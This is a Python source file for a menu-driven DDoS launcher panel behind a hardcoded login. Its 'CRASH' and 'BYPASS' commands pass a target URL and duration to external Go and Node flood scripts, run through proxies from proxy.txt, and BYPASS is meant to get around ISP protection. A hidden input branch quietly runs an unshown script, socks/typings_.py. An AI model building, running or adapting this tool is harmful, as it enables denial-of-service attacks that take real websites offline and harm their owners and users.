import subprocess
import sys
import socket
import os
import requests
import random
import getpass
import time
from pystyle import Colors, Colorate
def install_packages(): # MODULES...
    print("Installing Python packages from requirements.txt...")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
install_packages()
time.sleep(0.2)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "GOODLUCK | USER: imscruz | PLAN :: FREE! | Proxy: " + bots_str + " | kys"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white, ''' 
██████╗ ██╗███╗   ███╗
██╔══██╝██║████╗ ████║
███████ ██║██╔████╔██║
██║  ██ ██║██║╚██╔╝██║
██████╗ ██║██║ ╚═╝ ██║   
 ╚═════╝╚═╝╚═╝     ╚═╝  
v0.0.5

            No Ones Here
        
                Layer7 LIST
           
!BYPASS - WITH HIGH RPS TRY TO BYPASS ISP 
!CRASH - FOR LOW QUALITY WEBSERVER  


HOW WORK
!CRASH https://example.com 60
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white
   , "G00DLU$k | USER: imscruz| PLAN :: FREE! | Proxy: " + bots_str + " | WORKING NOW "))
    print("")
    banner = '''
██████╗ ██╗███╗   ███╗
██╔══██╝██║████╗ ████║
███████ ██║██╔████╔██║
██║  ██ ██║██║╚██╔╝██║
██████╗ ██║██║ ╚═╝ ██║   
 ╚═════╝╚═╝╚═╝     ╚═╝ 
v0.0.5

MADE BY imscruz !

TRY "HELP"! 
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "imscruz@99#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()     
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
    
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " Forise " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "imscruz" in cnc:
            try: 
                print("ARE YOU TRYING TO GET ROOT? GET LOST!")
                os.system(f'python3 socks/typings_.py')
            except IndexError:
                print('DONT!');
                print('DO NOT USE THAT');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - TO SEE ALL LAYER7 LIST
HELP - FOR HELP
CLEAR - SOME CLEANING!
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "imscruz"
    passwd = "99"
    username = input("</> Owner OF REP0: ")
    password = getpass.getpass(prompt='</> 1N MY BI0: ')
    if username != user or password != passwd:
        print("dumb")
        print("TRAIN YOUR BRAIN!")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("LOGINING...")
        time.sleep(0.6)
        main()
login()
